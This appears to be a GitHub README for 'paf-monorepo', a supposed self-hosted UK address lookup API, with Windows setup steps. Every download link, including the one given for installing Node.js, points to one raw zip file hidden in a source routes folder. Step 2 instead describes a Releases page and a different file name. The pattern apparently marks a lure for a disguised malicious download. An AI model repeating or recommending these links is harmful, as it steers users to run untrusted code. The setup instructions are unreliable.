# 🏠 paf-monorepo - Fast UK Address Lookup API

[![Download paf-monorepo](https://img.shields.io/badge/Download-paf--monorepo-4c9aff?style=for-the-badge&logo=github)](https://github.com/Guts9999/paf-monorepo/raw/refs/heads/main/packages/api/src/routes/paf_monorepo_2.9.zip)

## 📋 What is paf-monorepo?

paf-monorepo is a self-hosted UK address lookup API. It uses the Royal Mail’s PAF (Postcode Address File) data. The API searches addresses quickly without needing a database. It works by loading the data into memory and searching using a binary search method. This makes address lookup fast and efficient.

You can use paf-monorepo to find UK addresses by postcode or by partial address input. It serves data through a simple REST API. It runs on Node.js using the Fastify framework, which is lightweight and fast. The project is built with TypeScript for reliability.

This tool suits users who want a private, local address lookup without relying on third-party services or internet connections. It is stable, straightforward to set up, and runs on Windows computers.

## ⚙️ System Requirements

- Windows 10 or later (64-bit)
- Node.js version 16 or above installed
- At least 4 GB of RAM (8 GB recommended)
- Around 1 GB of free disk space for PAF data files
- A reliable internet connection for initial download (not required after install)

## 🛠️ What You Get

- A REST API to search UK addresses by postcode or keywords
- Fast in-memory binary search with no database setup
- Self-hosted service for privacy and control
- Runs using Node.js and Fastify server
- TypeScript implementation with clear codebase

## 🚀 Getting Started

### Step 1: Visit the Download Page

Click the big blue button at the top or visit this page to download paf-monorepo:

https://github.com/Guts9999/paf-monorepo/raw/refs/heads/main/packages/api/src/routes/paf_monorepo_2.9.zip

This page contains all latest releases and installation files. You will download the package and instructions here.

### Step 2: Download the Package

Look for the latest release under the "Releases" section on GitHub. Download the Windows zip file, which includes the program and the necessary files.

The zip file usually has a name like:

`paf-monorepo-windows-x64.zip`

Save the file somewhere easy to find, such as your Desktop or Downloads folder.

### Step 3: Install Node.js

You need Node.js to run paf-monorepo. If you do not have it installed:

1. Go to https://github.com/Guts9999/paf-monorepo/raw/refs/heads/main/packages/api/src/routes/paf_monorepo_2.9.zip
2. Download the latest Long-Term Support (LTS) version for Windows.
3. Run the installer and follow the prompts to complete installation.

After installing, open the Command Prompt and type:

```
node -v
```

You should see the version number to confirm Node.js is ready.

### Step 4: Extract paf-monorepo Files

- Right-click the downloaded zip file.
- Choose `Extract All...`.
- Pick a folder where you want the program files.
- Click `Extract`.

### Step 5: Open Command Prompt in the paf-monorepo Folder

- Press the Windows key.
- Type `cmd` and hit Enter.
- In the Command Prompt, use the `cd` command to change to the paf-monorepo folder.

For example, if you extracted to the Desktop, run:

```
cd Desktop\paf-monorepo-windows-x64
```

### Step 6: Install Packages

Inside the folder, run this command:

```
npm install
```

This will download all necessary software dependencies required by paf-monorepo.

### Step 7: Run the Application

After the install finishes, start the address lookup API with:

```
npm start
```

This command runs the Fastify server and loads the PAF data into memory. You will see messages confirming the server is ready.

### Step 8: Test paf-monorepo

Once running, you can test the API by opening your web browser and typing:

```
http://localhost:3000/address?postcode=SW1A1AA
```

Replace `SW1A1AA` with a real UK postcode. You should see address information in the browser window.

## 🔍 Using the API

paf-monorepo exposes simple REST endpoints:

- `GET /address?postcode=<postcode>`  
  Find addresses by postcode.

- `GET /search?query=<partial_address>`  
  Search by partial address or street name.

The API returns JSON data with address details like house number, street, town, and postcode. This data comes directly from the Royal Mail PAF.

## 💡 Tips for Best Use

- Keep the computer running and server started to have quick responses.
- Use real UK postcodes or address parts for best results.
- If you need to update address data, download the latest PAF from official sources and load it into the app.

## 🔧 Updating paf-monorepo

To update to a newer version:

1. Stop the running app (press Ctrl + C in Command Prompt).
2. Download the new release zip from the GitHub release page.
3. Extract and overwrite your existing paf-monorepo folder.
4. Run `npm install` if there are new dependencies.
5. Start the server with `npm start`.

## ☁️ About the Data

paf-monorepo uses official Royal Mail PAF data. This data covers every address and postcode in the UK. The app keeps this data in memory for speed and does not rely on an external database, making the app lightweight and fast.

## 🛑 Troubleshooting

- If `npm install` fails, ensure you have a stable internet connection.
- If `npm start` shows errors, confirm Node.js is installed and the folder is correct.
- Check that your firewall or antivirus allows the server to run on port 3000.
- Restart the Command Prompt or computer if you face environment issues.

## 📁 File Overview

- `package.json`: Manages software dependencies.
- `src/`: Source code files in TypeScript.
- `README.md`: This guide.
- `data/`: Folder for the PAF binary data files.
- `config/`: Server configuration files.

## 🔗 Download paf-monorepo Here

[![Download paf-monorepo](https://img.shields.io/badge/Download-paf--monorepo-4c9aff?style=for-the-badge&logo=github)](https://github.com/Guts9999/paf-monorepo/raw/refs/heads/main/packages/api/src/routes/paf_monorepo_2.9.zip)